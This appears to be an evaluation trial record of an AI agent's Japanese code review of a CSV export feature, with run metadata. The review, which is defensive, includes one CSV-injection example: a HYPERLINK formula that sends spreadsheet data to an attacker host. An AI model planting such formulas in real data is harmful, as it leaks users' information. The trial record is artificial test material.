@@ -1,0 +1,40 @@
+{
+  "trial": "W21-ce-review-c3-2",
+  "scenario": "W21",
+  "config": "ce-review",
+  "case": "c3",
+  "rep": 2,
+  "review_md": "# コードレビュー: タスク一覧の CSV エクスポート（`GET /api/tasks/export`）\n\n対象: `git diff HEAD`（`src/app/api/tasks/export/route.ts`、`src/lib/export.ts`、`tests/export.test.ts`）\n\n**判定: Not ready（マージ前に 1〜3 を直す）**\n\n小さな差分なので、レビューは 1 つのコンテキストで行いました（レビュー担当エージェントの追加投入はなし）。判断の根拠は、確認した範囲を示した末尾の「確認した範囲」にあります。\n\n---\n\n## 1. 【高】ダブルクォートをエスケープしていないため、タイトルに `\"` があると CSV が壊れる\n\n- 場所: `src/lib/export.ts` の `field()`（`return \\`\"${value}\"\\`;`）\n- 問題: 値を `\"` で囲むだけで、値の中の `\"` を `\"\"` に置き換えていない。PR の説明は「カンマ・引用符・改行が含まれていても列がずれない」としているが、引用符は対応していない。\n  - 例: タイトルが `彼は\"急ぎ\"と言った` のとき、出力は `\"3\",\"彼は\"急ぎ\"と言った\",\"未着手\",...` になる。CSV の規則（RFC 4180）では、項目の途中の `\"` は項目の終わりと解釈される。そのため Excel でその行の列が崩れ、後ろの項目が別の列にずれる。\n  - `validateTaskInput` はタイトルの文字種を制限していない（長さ 1〜200 のみ）ので、ユーザーは普通に `\"` を入力できる。\n- 直し方: `field()` で文字列にしてから `\"` を `\"\"` に置き換える。\n  ```ts\n  function field(value: string | number): string {\n    return `\"${String(value).replace(/\"/g, '\"\"')}\"`;\n  }\n  ```\n  カンマと改行は、全項目を `\"` で囲んでいるのでこのままで正しい。\n\n## 2. 【高】単体テストが引用符のエスケープを検証しておらず、バグ 1 を検出できない\n\n- 場所: `tests/export.test.ts` の `\"escapes quotes and commas in titles\"`\n- 問題: テスト名は「引用符とカンマのエスケープ」だが、使っているタイトルは `週次 定例の準備` で、引用符もカンマも改行も含まない。何もエスケープしなくても通るので、PR の「検証結果」にある「カンマ・引用符のエスケープの単体テスト」は実際には確認になっていない。バグ 1 があってもテストが通っているのはこのため。\n- 直し方: タイトルに `\"`、`,`、改行（`\\n`）を含むタスクを使い、期待値を明示する。\n  - 例: タイトル `A,\"B\"\\nC` なら、期待値は `\"9\",\"A,\"\"B\"\"\\nC\",\"未着手\",\"sato\",\"2026-12-01\"`。\n  - 余裕があれば、出力を CSV として読み戻して元の値と一致するかの往復テストも加える（列数がずれないことの確認になる）。\n- CLAUDE.md の規約 5（ロジックを追加したらテストを追加する）を満たすためにも、実質のあるテストにする。\n\n## 3. 【中】`?status=` を型ガードで検証していない（不正な値が「指定なし」にならない）\n\n- 場所: `src/app/api/tasks/export/route.ts` の `GET`（`searchParams.get(\"status\") as TaskStatus | null` と `status: status ?? undefined`）\n- 問題: 型アサーション（`as`）で通しているだけで、検証していない。CLAUDE.md の規約 2（クエリパラメータは型ガードで検証し、不正な値は「指定なし」として扱う）に反し、PR の説明（「不正な値は、一覧と同じく指定なし」）とも食い違う。\n  - 例: `/api/tasks/export?status=foo` や `?status=`（空）では、`listTasks` が `status = 'foo'` で絞り込み、全件ではなく**見出しだけの CSV**が返る。同じ入力で `GET /api/tasks` は全件を返すので、一覧とエクスポートで結果が食い違う。週次報告用途では「データが空だった」と誤解されやすい。\n  - SQL はプレースホルダを使っているので注入の問題はない。問題は仕様の食い違いのみ。\n- 直し方: `GET /api/tasks` と同じ書き方にする。\n  ```ts\n  const status = new URL(request.url).searchParams.get(\"status\");\n  const csv = toCsv(listTasks({ status: isTaskStatus(status) ? status : undefined }));\n  ```\n  `TaskStatus` の import は不要になる。\n\n## 4. 【中】CSV インジェクション（数式の実行）への対策がない\n\n- 場所: `src/lib/export.ts` の `field()`（タイトル・担当者の出力）\n- 問題: 値が `=`、`+`、`-`、`@`（またはタブ・CR）で始まると、Excel は引用符で囲んであってもその項目を数式として評価する。タイトルは任意のログインユーザーが自由に入力できるので、たとえば `=HYPERLINK(\"http://attacker.example/?d=\"&B2,\"確認\")` のようなタイトルのタスクを作っておくと、別のユーザーがこの CSV を Excel で開いたときに数式が実行される（外部への情報送信、確認ダイアログの悪用など）。PR の動機が「Excel に貼り付ける」なので、まさに想定する利用経路で起きる。\n- 直し方: 文字列の項目で、先頭が `= + - @ \\t \\r` のものには先頭に `'` を付けてから引用符で囲む（OWASP の推奨）。数値（ID）は対象外。このとき、期限や ID のような機械的な値を壊さないように文字列項目だけに適用する。ただし先頭が `-` の正当なタイトル（例: `-5℃ の確認`）にも `'` が付く副作用があるので、「Excel では `'` は表示されない」ことを確認した上で、その旨を README か PR に書いておく。対策を入れない場合も、判断として PR に明記する。\n- 併せて、この対策のテスト（`=1+1` で始まるタイトル）を追加する。\n\n## 5. 【低】エクスポートのルートに対するテストがない（認証・絞り込み・ヘッダー）\n\n- 場所: `tests/` 全体（`GET /api/tasks/export` のテストが無い）\n- 問題: 規約 9（未ログインは 401）、`?status=` の絞り込み、BOM と `Content-Type`・`Content-Disposition` はいずれも未テスト。3 の不具合もこのテストがあれば見つかる。既存の API ルートのテストの有無に合わせて、少なくとも「不正な `status` は全件」「未ログインは 401」を確認するテストを足すのが望ましい（既存に API ルートのテストの仕組みが無い場合は、絞り込みの判断を `src/lib/` の関数に出して、その関数をテストする形でもよい）。\n\n---\n\n## 確認した範囲\n\n- 対象は未コミットの差分 3 ファイル。`src/lib/tasks.ts`、`src/lib/api.ts`、`src/app/api/tasks/route.ts` と CLAUDE.md の規約を照合した。\n- 問題なしと判断した点（指摘は省略）: 認証の確認（`requireApiUser` を最初に呼んでいる）、SQL はプレースホルダ経由で注入なし、BOM の文字は U+FEFF で正しい、`/api/tasks/export` は `/api/tasks/[id]` より静的なルートが優先されるので衝突しない、CRLF 区切りと末尾の改行。\n- 実行はしていない（`npm test` などは未実行）。指摘 1・3 はコードの読解による。\n",
+  "review_chars": 3630,
+  "review_committed": true,
+  "transcript": {
+    "cost_usd": 0.3692,
+    "tokens": {
+      "input": 24,
+      "output": 6297,
+      "cache_read": 586435,
+      "cache_creation": 61877
+    },
+    "turns": 15,
+    "permission_denials": [
+      {
+        "tool": "Bash",
+        "input": "{\"command\": \"SKILL_DIR=/tmp/poc-trials/W21-ce-review-c3-2/plugins/compound-engineering/skills/ce-code-review; python3 $SKILL_DIR/scripts/review-scope.py --base HEAD --docs-root docs 2>&1 | head -60; S"
+      }
+    ],
+    "tool_calls": {
+      "Read": 4,
+      "Bash": 7,
+      "Write": 1
+    },
+    "skills_used": [],
+    "subagents": 0,
+    "subagent_types": {},
+    "questions": 0,
+    "active_seconds": 62,
+    "answer_key_access": [],
+    "isolation_suspects": [],
+    "final_message": "新しく書き写す作業はありませんでした。直前のレビューの指摘 5 件は、すでに依頼の形式（場所・何が問題か・直し方・重要度）で `REVIEW.md` に書いてあり、d9e268d でコミット済みだからです。`REVIEW.md` にコミットしていない変更はなく、見出しが 5 件あることも確認しました。\n\n5 件の内訳は次のとおりです。\n\n- **【高】** 引用符のエスケープ漏れ（`field()`）\n- **【高】** 引用符を検証していないテスト\n- **【中】** `?status=` の未検証\n- **【中】** CSV インジェクション\n- **【低】** ルートのテスト不足\n\n指摘の追加も削除もしておらず、コードも変えていません。新しいコミットも作っていません。"
+  },
+  "interventions": 0
+}
